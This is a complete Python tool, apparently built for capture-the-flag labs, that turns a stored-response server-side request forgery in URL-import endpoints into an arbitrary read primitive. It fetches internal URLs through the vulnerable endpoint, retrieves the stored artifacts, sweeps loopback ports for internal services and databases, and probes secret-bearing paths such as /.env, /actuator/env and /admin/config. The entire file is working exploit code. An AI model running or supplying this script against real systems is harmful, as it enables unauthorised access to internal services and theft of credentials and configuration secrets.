#!/usr/bin/env python3
"""ssrfget.py — drive a stored-response SSRF as an arbitrary read primitive.

Many "import from URL" features (avatar import, image fetch, webhook tester, PDF
render) save whatever they fetched to a public path and hand you back its URL.
That turns a blind SSRF into a full read: request an internal URL, then GET the
artifact the app just stored. This script does both halves in one call.

Usage:
  # read internal paths on the app's own port (the usual case)
  python ssrfget.py --base https://target --token TOK /admin/config /admin/health

  # sweep loopback ports to find internal services
  python ssrfget.py --base https://target --token TOK --sweep

  # non-default SSRF endpoint / body key / internal host
  python ssrfget.py --base https://target --token TOK \
      --endpoint /api/import --param src --host 127.0.0.1:8080 /internal/config

Notes:
  * The stored-artifact key is auto-detected (avatar_url, file, path, url, ...).
    If the endpoint returns the fetched content inline instead, that is printed too.
  * Paths are de-mangled automatically — Git Bash rewrites a leading /admin/config
    into C:/Program Files/Git/admin/config before Python ever sees it.
"""
import argparse
import concurrent.futures as cf
import json
import os
import random
import re
import string
import sys

import requests

requests.packages.urllib3.disable_warnings()

FLAG_RE = re.compile(r'(?:HTB|bug|flag|CTF|THM|PLab|picoCTF|RM|WEBVERSE)\{[^}]{3,90}\}', re.I)

# Ports worth trying on loopback. The app's own port is deliberately included --
# an internal admin API often lives on the SAME port behind a 403, so "only the
# app is listening" is not a dead end.
SWEEP_PORTS = [80, 443, 3000, 3001, 4000, 5000, 5001, 6379, 8000, 8001, 8080,
               8081, 8443, 8888, 9000, 9090, 9200, 11211, 27017, 5432, 3306]

# Paths to try once a port answers. Admin/config endpoints leak secrets as well
# as flags, so they lead.
PROBE_PATHS = ["/", "/admin", "/admin/config", "/admin/health", "/internal",
               "/config", "/debug", "/metrics", "/actuator/env", "/.env",
               "/api/admin", "/api/internal", "/flag"]


def demangle(p):
    """Undo MSYS/Git-Bash argv path conversion: it rewrites a leading /foo/bar
    into <GitRoot>/foo/bar before the interpreter sees it."""
    exe = os.environ.get("EXEPATH")
    roots = []
    if exe:
        roots.append(os.path.dirname(exe))          # C:\Program Files\Git\bin -> ...\Git
    roots += [r"C:\Program Files\Git", r"C:\Program Files (x86)\Git", r"C:\msys64"]
    norm = p.replace("\\", "/")
    for root in roots:
        r = root.replace("\\", "/").rstrip("/")
        if r and norm.lower().startswith(r.lower() + "/"):
            fixed = norm[len(r):]
            sys.stderr.write("[!] de-mangled %r -> %r\n" % (p, fixed))
            return fixed
    return norm if norm.startswith("/") else "/" + norm


def find_stored_path(obj):
    """Pull the stored-artifact path out of an arbitrary JSON response."""
    hits = []

    def walk(o):
        if isinstance(o, dict):
            for k, v in o.items():
                if isinstance(v, str) and v.startswith("/") and len(v) > 1:
                    # prefer keys that smell like a saved file
                    score = 2 if re.search(r'url|path|file|avatar|image|src|location', k, re.I) else 1
                    hits.append((score, v))
                else:
                    walk(v)
        elif isinstance(o, list):
            for v in o:
                walk(v)

    walk(obj)
    hits.sort(key=lambda t: -t[0])
    return hits[0][1] if hits else None


def calibrate(sess, a, host):
    """Fetch a bogus path on `host` so the SPA/404 fallback body can be recognised
    and suppressed. Without this a sweep buries the one real service under a dozen
    identical copies of the app's index.html."""
    bogus = "/" + "".join(random.choices(string.ascii_lowercase, k=18))
    _, body = ssrf(sess, a, "%s://%s%s" % (a.scheme, host, bogus))
    if body:
        sys.stderr.write("[*] %s fallback calibrated: %d bytes\n" % (host, len(body)))
    return body or None


def is_fallback(body, cal):
    """Same length and same first 200 chars as the calibrated not-found body."""
    if not cal or not body:
        return False
    return len(body) == len(cal) and body[:200] == cal[:200]


def ssrf(sess, a, url):
    """Trigger the SSRF for `url`; return (label, body_or_error)."""
    try:
        r = sess.post(a.base + a.endpoint, headers=a._headers,
                      json={a.param: url}, timeout=a.timeout, verify=False)
    except Exception as e:
        return "REQ-ERR", "%s: %s" % (type(e).__name__, e)

    try:
        j = r.json()
    except ValueError:
        return "HTTP %s" % r.status_code, (r.text or "")[:a.maxlen]

    stored = find_stored_path(j)
    if not stored:
        # no artifact -> the endpoint either errored or inlined the content
        return "HTTP %s" % r.status_code, json.dumps(j)[:a.maxlen]

    try:
        c = sess.get(a.base + stored, timeout=a.timeout, verify=False)
        return "stored:" + stored, (c.text or "")[:a.maxlen]
    except Exception as e:
        return "FETCH-ERR " + stored, str(e)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("paths", nargs="*", help="internal paths to read, e.g. /admin/config")
    ap.add_argument("--base", required=True, help="external target base URL")
    ap.add_argument("--endpoint", default="/api/profile/avatar/import",
                    help="the SSRF-able endpoint (default: %(default)s)")
    ap.add_argument("--param", default="url", help="JSON key holding the URL (default: %(default)s)")
    ap.add_argument("--host", default="127.0.0.1:3000", help="internal host:port (default: %(default)s)")
    ap.add_argument("--token")
    ap.add_argument("--cookie")
    ap.add_argument("--sweep", action="store_true", help="port sweep loopback, then probe paths on what answers")
    ap.add_argument("--scheme", default="http")
    ap.add_argument("--threads", type=int, default=6)
    ap.add_argument("--timeout", type=int, default=30)
    ap.add_argument("--maxlen", type=int, default=2000)
    ap.add_argument("--all", action="store_true",
                    help="show results that match the calibrated 404/SPA fallback too")
    a = ap.parse_args()

    a.base = a.base.rstrip("/")
    a._headers = {"Content-Type": "application/json"}
    if a.token:
        a._headers["Authorization"] = "Bearer " + a.token
    if a.cookie:
        a._headers["Cookie"] = a.cookie

    sess = requests.Session()
    flags = {}

    suppressed = [0]

    def report(label, target, body, cal=None):
        # flags are scanned even in suppressed bodies -- never let output
        # filtering be the reason a flag is missed
        for f in FLAG_RE.findall(body or ""):
            flags.setdefault(f, target)
        if is_fallback(body, cal) and not a.all:
            suppressed[0] += 1
            return
        print("== %s  [%s]" % (target, label))
        print(body.strip()[:a.maxlen] if body else "(empty)")
        print()

    if a.sweep:
        print("[*] sweeping loopback ports via %s (%s)\n" % (a.endpoint, a.param))
        live = []

        def try_port(p):
            return p, ssrf(sess, a, "%s://127.0.0.1:%d/" % (a.scheme, p))

        with cf.ThreadPoolExecutor(a.threads) as ex:
            for p, (label, body) in ex.map(try_port, SWEEP_PORTS):
                if label.startswith("stored:") or label.startswith("HTTP 2"):
                    live.append(p)
                    print("[+] %-6d OPEN  %s" % (p, (body or "")[:120].replace("\n", " ")))
                    for f in FLAG_RE.findall(body or ""):
                        flags.setdefault(f, "127.0.0.1:%d/" % p)
                else:
                    print("[-] %-6d %s" % (p, (body or "")[:80].replace("\n", " ")))

        print("\n[*] live ports: %s" % (live or "none"))
        print("[*] probing common paths on each -- an admin API often sits on the")
        print("    app's OWN port behind an external-only 403\n")
        for p in live:
            host = "127.0.0.1:%d" % p
            cal = calibrate(sess, a, host)
            targets = ["%s://%s%s" % (a.scheme, host, q) for q in PROBE_PATHS]
            with cf.ThreadPoolExecutor(a.threads) as ex:
                for t, (label, body) in zip(targets, ex.map(lambda u: ssrf(sess, a, u), targets)):
                    if label.startswith("stored:") or label.startswith("HTTP 2"):
                        report(label, t, body, cal)
    else:
        if not a.paths:
            ap.error("give one or more paths, or --sweep")
        cal = calibrate(sess, a, a.host)
        targets = ["%s://%s%s" % (a.scheme, a.host, demangle(p)) for p in a.paths]
        with cf.ThreadPoolExecutor(a.threads) as ex:
            for t, (label, body) in zip(targets, ex.map(lambda u: ssrf(sess, a, u), targets)):
                report(label, t, body, cal)

    if suppressed[0]:
        print("[*] %d result(s) matched the 404/SPA fallback and were hidden (--all to show)"
              % suppressed[0])
    if flags:
        print("!" * 60)
        for f, where in flags.items():
            print("FLAG: %s   <- %s" % (f, where))
        print("!" * 60)
    return 0


if __name__ == "__main__":
    sys.exit(main())
